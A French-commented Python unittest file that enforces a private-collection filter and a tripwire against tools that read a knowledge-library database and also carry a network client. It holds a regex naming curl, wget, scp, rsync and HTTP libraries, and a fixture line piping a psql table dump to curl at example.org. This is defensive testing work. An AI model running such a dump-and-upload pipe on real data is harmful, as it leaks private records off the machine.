"""
Collections privées (organisation-context, design D3 et D11, tâche 3.3) : le filtre, l'analyse du nom en littéral dans tools/, et le
fil de déclenchement (tripwire) contre un futur outil d'envoi hors du Mac.

    bash tests/run_all.sh private_collections

Aucune base, aucun réseau : les deux contrôles lisent le texte des fichiers suivis de tools/. Le fil de déclenchement n'est jamais sauté
faute de base.
"""
import re
import subprocess
import sys
import unittest
from pathlib import Path

RACINE = Path(__file__).resolve().parents[2]
OUTILS = RACINE / "tools"
sys.path.insert(0, str(OUTILS))
import private_collections as pc  # noqa: E402

# Fichiers de tools/ qui écrivent le mot « contexte » entre guillemets sans parler de la collection, avec la raison.
LITTERAL_PERMIS = {
    "tools/private_collections.py": "la définition de la constante, seul endroit permis",
    "tools/lab_paths.py": "le nom du dossier de contexte sous le dossier du lab, pas le nom de la collection",
    "tools/journal_lab_messages.py": "l'étiquette française d'une phrase du journal de coaching, sans rapport avec la collection",
}

# Magasin de la bibliothèque : l'outil l'ouvre quand il importe le module de lecture ou d'écriture, ou nomme le schéma dans du SQL.
MAGASIN = re.compile(r"knowledge_library|KnowledgeStore|knowledge\.(?:books|chunks|collections|book_collections)")
# Client réseau : une bibliothèque HTTP, une commande d'envoi, ou l'outil gh.
RESEAU = re.compile(r"\bimport\s+(?:httpx|requests|socket)\b|\bfrom\s+(?:httpx|requests)\b|urllib\.request|http\.client"
                    r"|(?:^|[\s;|&(`\"'])(?:curl|wget|scp|rsync|gh)\s", re.MULTILINE)

# Fichiers qui ouvrent le magasin ET portent un client réseau, admis avec leur raison (D11). Un futur outil d'envoi (R-24) n'y entre que
# lorsqu'un test prouve que `without_private` filtre ce qu'il envoie.
LISTE_BLANCHE = {
    "tools/pmzilla_lab_library.py": "l'indexeur : appelle le service d'embedding, refusé hors boucle locale quand une note privée est à indexer",
}


def fichiers_de_tools() -> dict:
    """Texte des fichiers Python et shell suivis de tools/ (sans dépôt : ceux du dossier)."""
    r = subprocess.run(["git", "-C", str(RACINE), "ls-files", "-z", "--", "tools"], capture_output=True, text=True)
    noms = [p for p in r.stdout.split("\0") if p] if r.returncode == 0 and r.stdout else \
        [str(p.relative_to(RACINE)) for p in OUTILS.rglob("*") if p.is_file() and "__pycache__" not in p.parts]
    textes = {}
    for nom in sorted(noms):
        if not nom.endswith((".py", ".sh")):
            continue
        try:
            textes[nom] = (RACINE / nom).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
    return textes


def declencheurs(textes: dict) -> list:
    """Les fichiers qui ouvrent le magasin et portent un client réseau (le fil de déclenchement)."""
    return sorted(nom for nom, texte in textes.items() if MAGASIN.search(texte) and RESEAU.search(texte))


class Filtre(unittest.TestCase):
    def test_constante_et_ensemble(self):
        self.assertEqual(pc.CONTEXT_COLLECTION, "contexte")
        self.assertIn(pc.CONTEXT_COLLECTION, pc.PRIVATE_COLLECTIONS)

    def test_le_filtre_retire_les_privees(self):
        self.assertEqual(pc.without_private([pc.CONTEXT_COLLECTION, "watch", "produit"]), ["watch", "produit"])
        self.assertEqual(pc.without_private([]), [])
        self.assertEqual(pc.without_private(["watch"]), ["watch"])

    def test_shareable(self):
        self.assertFalse(pc.shareable([pc.CONTEXT_COLLECTION]))
        self.assertFalse(pc.shareable(["watch", pc.CONTEXT_COLLECTION]))
        self.assertTrue(pc.shareable(["watch", "produit"]))


class NomEnLitteral(unittest.TestCase):
    def test_aucun_fichier_de_tools_n_ecrit_le_nom_de_la_collection(self):
        motif = re.compile(r"""["']""" + re.escape(pc.CONTEXT_COLLECTION) + r"""["']""")
        trouves = []
        for nom, texte in fichiers_de_tools().items():
            if nom in LITTERAL_PERMIS:
                continue
            trouves += [f"{nom}:{n}" for n, ligne in enumerate(texte.splitlines(), 1) if motif.search(ligne)]
        self.assertEqual(trouves, [], "le nom de la collection de contexte est écrit en littéral (chemin:ligne) : importer private_collections")

    def test_le_detecteur_attrape_un_litteral(self):
        motif = re.compile(r"""["']""" + re.escape(pc.CONTEXT_COLLECTION) + r"""["']""")
        self.assertTrue(motif.search('collections = ["contexte"]'))
        self.assertTrue(motif.search("x = 'contexte'"))
        self.assertFalse(motif.search("le contexte local"))

    def test_les_exceptions_existent_et_ont_une_raison(self):
        textes = fichiers_de_tools()
        for nom, raison in LITTERAL_PERMIS.items():
            self.assertIn(nom, textes)
            self.assertTrue(raison.strip())


class FilDeDeclenchement(unittest.TestCase):
    def test_un_nouvel_outil_d_envoi_fait_echouer_le_test(self):
        faux = {"tools/envoi.py": "import httpx\nimport knowledge_library\nhttpx.post(url)\n",
                "tools/lecture.py": "import knowledge_library\n",
                "tools/reseau.py": "import httpx\n"}
        self.assertEqual(declencheurs(faux), ["tools/envoi.py"])
        faux_shell = {"tools/envoi.sh": "psql -c 'SELECT * FROM knowledge.chunks' | curl -d @- https://example.org\n"}
        self.assertEqual(declencheurs(faux_shell), ["tools/envoi.sh"])

    def test_seuls_les_fichiers_de_la_liste_blanche_declenchent(self):
        trouves = declencheurs(fichiers_de_tools())
        self.assertEqual([n for n in trouves if n not in LISTE_BLANCHE], [],
                         "outil de tools/ qui ouvre la bibliothèque et porte un client réseau, sans entrée justifiée dans LISTE_BLANCHE")

    def test_chaque_entree_de_la_liste_blanche_est_vivante_et_justifiee(self):
        trouves = declencheurs(fichiers_de_tools())
        for nom, raison in LISTE_BLANCHE.items():
            with self.subTest(nom):
                self.assertTrue(raison.strip())
                self.assertIn(nom, trouves, "entrée périmée : le fichier ne déclenche plus le fil")

    def test_le_test_ne_depend_pas_de_la_base(self):
        texte = Path(__file__).read_text(encoding="utf-8")
        self.assertNotIn("skip" + "Test", texte)
        self.assertNotIn("skip" + "Unless", texte)


if __name__ == "__main__":
    unittest.main()
